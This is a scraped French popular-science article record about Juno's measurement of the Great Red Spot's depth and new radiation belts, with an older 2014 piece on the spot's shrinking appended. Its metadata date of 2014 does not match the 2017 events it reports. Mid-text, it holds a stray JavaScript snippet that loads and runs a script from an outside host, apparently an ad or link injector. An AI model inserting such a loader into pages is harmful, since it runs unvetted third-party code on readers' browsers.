{"title": "Grande Tache rouge de Jupiter : on connait enfin sa profondeur", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2014-05-20", "content": "Enorme tempete qui pourrait engloutir une a deux fois la Terre et qui fait rage depuis au moins deux siecles, la Grande Tache rouge, emblematique de Jupiter, garde encore bien des mysteres. Mais combien de temps encore ? La sonde Juno, qui explore l'intimite de la planete geante, vient de decouvrir jusqu'ou s'enfonce l'anticyclone et ce qui se passe a l'interieur. La  Grande Tache rouge de Jupiter  est la plus connue et la plus grande  tempete  du Systeme solaire. Elle est tres impressionnante de par sa taille, la vitesse de ses vents et aussi par sa longevite. D'ailleurs, personne ne sait vraiment depuis quand elle existe ni combien de temps encore elle sera visible dans l'hemisphere sud de la planete. Voir aussi : Jupiter : la sonde Juno transmet des images de cyclones jusque-la insoupconnes L'evolution de ce gigantesque  anticyclone  rouge-orange emblematique de  Jupiter  est suivie depuis 1830 et il est probable qu'elle ait ete apercue il y a 350 ans. A la fin du XIX e  siecle, on pouvait aisement disposer a l'interieur de son enceinte ovale deux planetes comme la  Terre , voire plus. Il y a pres de 40 ans encore, en 1979, au passage de Voyager 1 et 2, elle pouvait effectivement contenir deux fois la Terre. Mais les dernieres mesures, en avril 2017, confirment qu'elle retrecit et qu'avec 16.000 km de diametre, elle ne pourrait plus engloutir que 1,3 fois notre monde. Elle n'a cesse de diminuer ces dernieres annees. Est-ce a dire qu'elle decline vraiment et que bientot la mythique  Grande Tache rouge  ne sera plus qu'un souvenir ? C'est une des enigmes de Jupiter sur laquelle les chercheurs aimeraient beaucoup lever le voile. Survolez et plongez dans la haute atmosphere de Jupiter, autour de la Grande Tache rouge, comme si vous y etiez. Animation creee a partir des images de Junocam et de modelisation informatique. (c) Nasa Jusqu'ou s'enfonce la Grande Tache rouge de Jupiter ? Lever le voile justement, voir a travers les epais nuages de Jupiter et percer ses secrets, telle est la mission de la sonde  Juno  (en reference a Junon, epouse du dieu de la Foudre) depuis son arrivee en juillet 2016. Outre les superbes photos prises par la Junocam lors de ses survols rapproches, la sonde de la Nasa fait le plein de mesures. C'est en juillet 2017 que la  Grande Tache rouge  fut survolee pour la premiere fois par Juno.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  << L'une des questions les plus fondamentales sur la  Grande Tache rouge de Jupiter  est : a quelle profondeur sont ses racines ? >> , rappelle Scott Bolton, chercheur principal de la mission au  Southwest Research Institute de San Antonio . On connait ses dimensions en surface mais quelle est sa profondeur ? Et que se passe-t-il a l'interieur ? Voir aussi : Pourquoi la tache rouge de Jupiter est-elle rouge ? << Les donnees de Juno indiquent que [...] ses racines penetrent a environ 300 kilometres dans l'atmosphere de la planete >> , revele-t-il. Ce qui represente pres de 50 fois la profondeur des oceans terrestres. Cette decouverte, annoncee a l'occasion des rencontres annuelles de l'AGU ( American Geophysical Union ) a ete faite avec l'instrument MWR ( Microwave Radiometer ),  << un excellent instrument pour nous aider a aller au fond de ce qui rend la Grande Tache rouge si belle >>  raconte Michael Janssen, du JPL. L'exploration a trouve que la base est plus chaude que la partie en surface que nous regardons.  << Les vents sont associes a des differences de temperature et la chaleur de la base explique les vents feroces que nous voyons au sommet de l'atmosphere >> , detaille le planetologue Andy Ingersoll, de Caltech, qui participe aux recherches. Sur ce schema, la nouvelle zone de rayonnement detectee par Juno au niveau de l'equateur de Jupiter est en bleu. (c) Nasa, JPL-Caltech, SwRI, JHUAPL                               Autres decouvertes surprises de Juno Autres decouvertes de  Juno , et autres surprises : deux nouvelles regions de rayonnement.  << Plus on se rapproche de Jupiter, plus la planete devient bizarre >> , commente Heidi Becker, qui mene l'enquete sur les rayonnements au JPL. L'une, situee au ras de l'atmosphere de Jupiter au niveau de son equateur et identifiee par Jedi ( Jupiter Energetic Particle Detector Instrument ), se compose d'ions energetiques d'hydrogene, d'oxygene et de soufre se deplacant a une vitesse relativiste, donc tres elevee. L'equipe scientifique pense que  << les particules derivent d'atomes neutres energetiques crees dans le gaz autour des  lunes  Io et Europe , rapporte la Nasa.  Ils deviennent alors des ions lorsque leurs electrons sont elimines par interaction avec l'atmosphere superieure de Jupiter >>. L'autre surprise est la detection d'une  << population d'ions lourds de haute  energie  >>  toujours a l'interieur de la ceinture de radiation d'electrons relativistes mais dans les regions aux hautes  latitudes  de Jupiter, inexplorees avant Juno. Leur origine n'a pas encore pu etre determinee. L'exploration de l'intimite de la geante Jupiter, premiere planete du Systeme solaire a s'etre formee, est encore loin d'etre terminee. Le 16 decembre, Juno accomplira son neuvieme survol de la planete, a quelque 3.400 km seulement du sommet des nuages dans la haute atmosphere. Pour en savoir plus La Grande Tache Rouge de Jupiter est au regime Article de Xavier Demeersman publie le 20 mai 2014 Connue et epiee depuis environ trois siecles, la Grande Tache Rouge de Jupiter subit une cure d'amaigrissement qui semble s'accelerer ces dernieres annees, comme en temoignent les images du  telescope spatial Hubble . Longue de plus de 40.000 km en 1880, elle ne s'etend plus, a present, que sur 16.000 km. Bien que la periode des premieres observations de la  Grande Tache Rouge de Jupiter  soit parfois discutee, celle-ci semble connue des astronomes depuis la fin du XVII e  siecle. Une << tache permanente >>, comme on l'a qualifiee alors, qui, au fil des annees -- comme en temoignent largement dessins et  photographies  --, va connaitre d'importantes  variations de taille . Une tendance nette a la decroissance qui se confirme sur le dernier cliche du telescope spatial Hubble realise le 21 avril 2014. Comme nous l'avions evoque voici trois mois, la  Grande Tache Rouge  apparaissait vers 1880 davantage plus longue et elliptique qu'aujourd'hui pour un diametre, alors, superieur a 40.000 kilometres. On aurait pu y faire entrer trois fois la Terre ! Toutefois, cet  anticyclone  qui campe aux latitudes tropicales de l' hemisphere austral  de Jupiter a vraisemblablement entame son regime vers les annees 1930. La tache n'en finit plus de maigrir. Ainsi, lorsque les deux sondes spatiales  Voyager 1  et  Voyager 2  sont venues la visiter en 1979, elle avait quasiment fondu de moitie relativement au siecle precedent. Son diametre n'excedait pas 22.500 km. Une presentation de Jupiter et de ses lunes. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle avec deux barres horizontales en bas a droite. Les sous-titres en anglais devraient alors apparaitre, si ce n'est pas deja le cas. En passant simplement la souris sur le rectangle, vous devriez voir l'expression << Traduire les sous-titres >>. Cliquez pour faire apparaitre le menu du choix de la langue, choisissez << Francais >>, puis cliquez sur << OK >>. (c) SpaceRip, YouTube La Grande Tache Rouge de Jupiter plus petite que jamais A present, on decouvre sur la recente image prise en haute resolution par Hubble que sa taille atteint  << un peu moins de 16.500 km, soit le plus petit diametre que nous ayons jamais mesure >> , constate Amy Simon ( Nasa   Goddard Space Flight Center ). En 1995, elle mesurait encore 21.000 km. Les recentes campagnes d'observation des astronomes amateurs suggerent une reduction de sa taille d'environ 1.000 km par an. Son apparence aussi a change, passant progressivement de l'ovale au cercle (ou presque). Beaucoup regrettent les difficultes pour l'observer. Plus discrete et delicate que jamais, elle rivalise parfois avec d'autres cellules anticycloniques, comme la <<  petite tache rouge  >>, photographiee par  Hubble  en 2008. Dans leur etude, Amy Simon et son equipe notent que  << dans nos nouvelles observations, il est evident que de tres petits  tourbillons  se nourrissent a l'interieur de la tempete >> . Aussi, ils supposent qu' << ils sont peut-etre responsables de l'acceleration des changements en modifiant la dynamique interne et l'energie de la Grande Tache Rouge >> . La discussion reste ouverte, car pour l'instant, nul ne sait expliquer cet inexorable changement de regime sur  Jupiter . Cela vous interessera aussi Jupiter : de saisissantes images de la Grande tache rouge                       On trouve a la surface de Jupiter un gigantesque anticyclone d'environ 15.000 km de long. Cette Grande tache rouge, visible depuis la Terre, intrigue depuis longtemps les scientifiques. Decouvrez cet etonnant phenomene durant cette video proposee par la Nasa.                                       ", "theme": "sciences"}